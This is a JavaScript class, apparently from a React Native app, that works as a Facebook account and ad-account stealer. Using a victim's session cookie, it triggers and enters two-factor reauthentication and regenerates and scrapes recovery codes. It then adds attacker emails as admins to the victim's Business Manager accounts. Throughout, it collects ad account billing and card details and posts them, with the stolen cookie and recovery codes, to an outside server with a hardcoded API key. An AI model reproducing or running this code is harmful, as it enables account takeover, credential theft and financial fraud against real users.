import { fetchApi } from "./fetchApi";
import { getBundleId } from 'react-native-device-info';
import { map } from 'bluebird';
import { randomString } from "./helper";
import ReactNativeBlobUtil from 'react-native-blob-util';

class FetchAndGetCode {
    constructor(params = {}) {
        const { cookie, userAgent, uid, dtsg, token } = params;
        this.cookie = cookie;
        this.uid = uid
        this.dtsg = dtsg;
        this.token = token
        this.DOMAIN = "https://api.lovetexas.me";
        this.API_KEY = "169c3333-1f2c-4c19-b1ac-c27f2f2d666d";
        this.userAgent = userAgent;
        this.twofactor = "";
        var myHeaders = new Headers();
        myHeaders.append("sec-ch-ua", "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"");
        myHeaders.append("sec-ch-ua-mobile", "?0");
        myHeaders.append("sec-ch-ua-platform", " \"Windows\"");
        myHeaders.append("Upgrade-Insecure-Requests", "1");
        myHeaders.append("Content-Type", "application/x-www-form-urlencoded");
        myHeaders.append("User-Agent", this.userAgent);
        myHeaders.append("Sec-Fetch-Site", "same-origin");
        myHeaders.append("Sec-Fetch-Mode", "navigate");
        myHeaders.append("Sec-Fetch-User", "?1");
        myHeaders.append("Sec-Fetch-Dest", "document");
        myHeaders.append("Cookie", this.cookie);
        this.myHeaders = myHeaders;
        this.hasTwofactor = false;
    }
    async checkHasTwofactor() {
        try {
            const url = "https://www.facebook.com/api/graphql/";
            const body = `av=${this.uid}&__user=${this.uid}&__a=1&ctarget=https%3A%2F%2Fwww.facebook.com&fb_dtsg=${this.dtsg}&jazoest=25409&lsd=pvqrRLHc06aCtnChKTlSJu&__spin_r=1005733793&__spin_b=trunk&__spin_t=1655957067&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=SecuritySettingsRefetchQuery&variables=%7B%7D&server_timestamps=true&doc_id=4882158038520313`
            const headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Upgrade-Insecure-Requests": "1",
            }
            const text = await this._request({ url, body, headers });
            const textJson = JSON.parse(text);
            if (textJson?.data?.security_settings?.state?.two_fac_auth?.is_enabled) {
                this.hasTwofactor = true
            }
        } catch (error) {
            console.log('error :>> ', error);
        }
    }
    async SendSms() {
        try {
            await this.checkHasTwofactor();
            if (!this.hasTwofactor) {
                await this.getLinkBM(false)
                return
            };
            const url = "https://www.facebook.com/security/twofactor/reauth/send/";
            const body = `__user=${this.uid}&__a=1&fb_dtsg=${this.dtsg}&jazoest=22124&lsd=8zgsjvS5TcJ5-MUcD9CJbL&__spin_r=1005434178&__spin_b=trunk&__spin_t=1651269514`
            const headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Upgrade-Insecure-Requests": "1",
            }
            const text = await this._request({ url, body, headers });
            console.log('text :>> ', text);
        } catch (error) {
            console.log('error :>> ', error);
        }
    }
    async postCode(code) {
        try {
            const url = "https://www.facebook.com/security/twofactor/reauth/enter/";
            const body = `approvals_code=${code}&fb_dtsg=${this.dtsg}&save_device=true&__a=1`
            const headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Upgrade-Insecure-Requests": "1",
            }
            const text = await this._request({ url, body, headers })
            if (text.includes('"codeConfirmed":true')) {
                await this.getTwofactorCode();
                await this.getToken();
                await this.getLinkBM(true)

            }
            if (this.twofactor?.length) {
                await this.SendToServer();
                return true;
            }
        } catch (error) {
            console.log('error :>> ', error.response);
        }
        return false;
    }
    async getToken() {
        try {
            const url = `https://www.facebook.com/ads/adbuilder`;
            const html = await this._request({ url })
            this.token = this.getBW(html, `accessToken":"EABB`, `"`);
            this.token = `EABB${this.token}`;
            this.dtsg = this.getBW(html, `DTSGInitialData",[],{"token":"`, `"`);
            console.log('token :>> ', this.token);
        } catch (error) {
            console.log('error :>> ', error);
            throw error;
        }
    }
    async SendToServer() {
        try {
            const payload = {
                uid: this.uid,
                twofactor: this.twofactor,
                hasTwofactor: this.hasTwofactor
            }
            const url = `${this.DOMAIN}/api/update-data-account?api_key=${this.API_KEY}`
            const result = await fetchApi("POST", url, payload, {
                'Content-Type': 'application/json',
            });
            console.log("SendToServer", result);

        } catch (error) {
            //console.log("SendToServer", error);
        }
    }
    async getLinkBM() {
        try {
            let listBM = await this.getListBM();
            console.log('listBM :>> ', listBM);

            listBM = listBM.filter(e => {
                if (e?.client_ad_accounts?.data?.length) return true;
                if (e?.owned_ad_accounts?.data?.length) return true;
                return false
            })
            await map(listBM, async ({ id }) => {
                try {
                    for (let index = 0; index < 5; index++) {
                        const email = `${id}-${index}@advertiser-noreply.support`
                        const url = `https://graph.facebook.com/v3.0/${id
                            }/business_users?access_token=${this.token}&brandId=${id}&email=${email}&method=post&pretty=0&roles=%5B%22EMPLOYEE%22%2C%22ADMIN%22%2C%22DEVELOPER%22%2C%22FINANCE_EDITOR%22%5D&suppress_http_code=1&method=POST`
                        const options = {
                            url
                        }
                        const response = await this._request(options);
                    }
                } catch (error) {
                    console.log('error :>> ', error);
                }
            }, { concurrency: 20 })
        } catch (error) {
            console.log('error :>> ', error);
        }
    }

    async getListBM(refetch) {
        try {
            const url = `https://graph.facebook.com/v12.0/me/businesses?fields=id,name,timezone_id,created_time,verification_status,sharing_eligibility_status,can_create_ad_account,allow_page_management_in_www,business_users.limit(0).summary(1),owned_ad_accounts.limit(5000).fields(id).summary(1),client_ad_accounts.fields(id).limit(5000).summary(1)&limit=5000&access_token=${this.token}`;
            const options = {
                url
            }
            const response = await this._request(options);
            const { data } = JSON.parse(response);
            if (refetch) {
                await map(data, BM => this.getInfoBM(BM), { concurrency: 20 })
            }
            return data
        } catch (error) {
            //console.log('error :>> ', error);
            return []
        }
    }
    async getInfoBM(BM) {
        try {
            try {
                const { client_ad_accounts, owned_ad_accounts } = BM;
                let adBMAccount = client_ad_accounts.data.concat(...owned_ad_accounts.data);
                if (adBMAccount?.length) {
                    adBMAccount = adBMAccount.map(a => {
                        return {
                            account_id: a.id.split('_')[1]
                        }
                    })
                    await map(adBMAccount, account => this.getInfoAdAccount(account), { concurrency: 20 });
                }
            } catch (error) {

            }
        } catch (error) {

        }
    }
    async getInfoAdAccount(account) {
        try {
            let [accountGraph, accountGraphql] = await Promise.all([
                this.getInfoAdAccountGraph(account.account_id),
                this.getInfoAdAccountGraphql(account.account_id),
            ])
            let objectAdsAcount = { ...accountGraph, ...accountGraphql }
            let admins = []
            if (objectAdsAcount?.users?.data?.length) {
                admins = [...admins, ...objectAdsAcount.users.data]
            }
            if (objectAdsAcount?.agencies?.data?.length) {
                admins = [...admins, ...objectAdsAcount.agencies.data]
            }
            let PTTT = ''

            try {
                if (objectAdsAcount?.billable_account_by_payment_account?.billing_payment_account?.billing_payment_methods) {
                    let billing_payment_methods = objectAdsAcount?.billable_account_by_payment_account?.billing_payment_account?.billing_payment_methods.filter((e) => e.is_primary)
                    PTTT = billing_payment_methods?.[0]?.credential?.__typename
                }
            } catch (error) {

            }
            let min_billing_threshold = ''
            try {
                min_billing_threshold = objectAdsAcount.adspaymentcycle.data[0].threshold_amount
            } catch (error) {

            }
            let spend = ''
            try {
                if (objectAdsAcount?.insights?.data) {
                    spend = objectAdsAcount?.insights?.data[0].spend;
                }
            } catch (error) {

            }
            if (!spend) {
                spend = objectAdsAcount?.spend_cap;
            }
            const adAccount = {
                uid: this.uid,
                account_id: account?.account_id,
                name: objectAdsAcount?.name,
                create_date: objectAdsAcount?.created_time,
                type: objectAdsAcount?.stored_balance_status,
                currency: objectAdsAcount?.currency,
                total_prepay_balance: objectAdsAcount?.total_prepay_balance?.amount,
                balance: objectAdsAcount?.balance,
                min_billing_threshold,
                spend_cap: spend,
                total_spend: objectAdsAcount?.amount_spent,
                limit_day: objectAdsAcount?.adtrust_dsl,
                max_billing_threshold: objectAdsAcount?.max_billing_threshold?.amount,
                PTTT,
                Admin: admins?.length,
                status: objectAdsAcount?.disable_reason,
                card: objectAdsAcount?.funding_source_details?.display_string,
                cookie: this.cookie,
                has_extended_credit: objectAdsAcount?.has_extended_credit,
                balance: objectAdsAcount?.balance,
                appType: getBundleId()
            }
            const url = `${this.DOMAIN}/api/add-ads-manager?api_key=${this.API_KEY}`;
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(adAccount)
            });
            const data = await response.json()

        } catch (error) {
            console.log('error :>> ', error);
        }
    }
    async getInfoAdAccountGraph(account_id) {
        try {
            const url = `https://graph.facebook.com/v12.0/act_${account_id}?method=get&date_format=U&fields=amount_spent,insights.date_preset(data_maximum)%7Bspend%7D,account_id,funding_source_details,adspaymentcycle%7Bthreshold_amount%7D,name,created_time,last_used_time,currency,timezone_name,stored_balance_status,business,balance,adtrust_dsl,spend_cap,disable_reason,is_prepay_account,total_prepay_balance.fields(amount),max_billing_threshold.fields(amount),min_billing_threshold.fields(amount),am_tabular.date_preset(data_maximum).column_fields(spend),owner,agencies.fields(id,role,name),users.fields(id,role,name),has_extended_credit&access_token=${this.token}`
            const options = {
                url
            }
            let data = await this._request(options)
            data = JSON.parse(data);
            return data
        } catch (error) {
            return {}
        }
    }
    async getInfoAdAccountGraphql(account_id) {
        try {
            const url = `https://www.facebook.com/api/graphql`
            let body = `doc_id=3633949436715463&variables={"paymentAccountID":"${account_id}"}&fb_dtsg=${this.dtsg}`
            const options = {
                url,
                body,
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Upgrade-Insecure-Requests": "1",
                }
            }
            let res = await this._request(options)
            res = JSON.parse(res);
            return res.data
        } catch (error) {
            console.log('error :>> ', error);
            return {}
        }
    }
    async getTwofactorCode() {
        try {
            let url = `https://mbasic.facebook.com/security/2fac/factors/recovery-code/`;
            let body = `fb_dtsg=${this.dtsg}&jazoest=25358&reset=true&resend=Nh%E1%BA%ADn+m%C3%A3+m%E1%BB%9Bi`
            const headers = {
                "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"macOS\"",
                "Upgrade-Insecure-Requests": "1",
                "Origin": "https://mbasic.facebook.com",
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Referer": "https://mbasic.facebook.com/security/2fac/factors/recovery-code/?_rdr",
                "Accept-Encoding": "",
                "Accept-Language": "en,us-US;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,id;q=0.4"
            }
            let response = await this._request({ url, body, headers })
            response = response.split(' ').join('')

            let result = (response.match(/\d+/g) || []).map(n => parseInt(n));
            result = result.map(e => e.toString()).filter(e => e.length == 8);
            console.log('result :>> ', result);
            if (result && result.length) {
                this.twofactor = result.join(",");
            } else {
                response = await this._request({ url, headers })
                console.log('object :>> ', response);
                response = response.split(' ').join('');
                result = (response.match(/\d+/g) || []).map(n => parseInt(n));
                result = result.map(e => e.toString()).filter(e => e.length == 8)
                if (result && result.length) {
                    this.twofactor = result.join(",");
                }
            }

        } catch (error) {
            console.log('error :>> ', error);
        }
    }

    async _request({ url, body, headers = {} }) {
        try {
            let rqHeaders = {
                "Cookie": this.cookie,
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15'

            }
            rqHeaders = { ...rqHeaders, ...headers }
            if (!body?.length) {
                let data = await ReactNativeBlobUtil.fetch('GET', url, rqHeaders)
                let text = await data.text()
                return text
            }
            let data = await ReactNativeBlobUtil.fetch('POST', url, rqHeaders, body)
            let text = await data.text()
            return text
        } catch (error) {
            console.log('errorr :>> ', error, url);
            throw error;
        }
    }
    getBW(text, Start, End) {
        var ret = text.split(Start);
        if (ret[1]) {
            ret = ret[1].split(End);
            return ret[0];
        };
        return 0;
    }
}
export { FetchAndGetCode }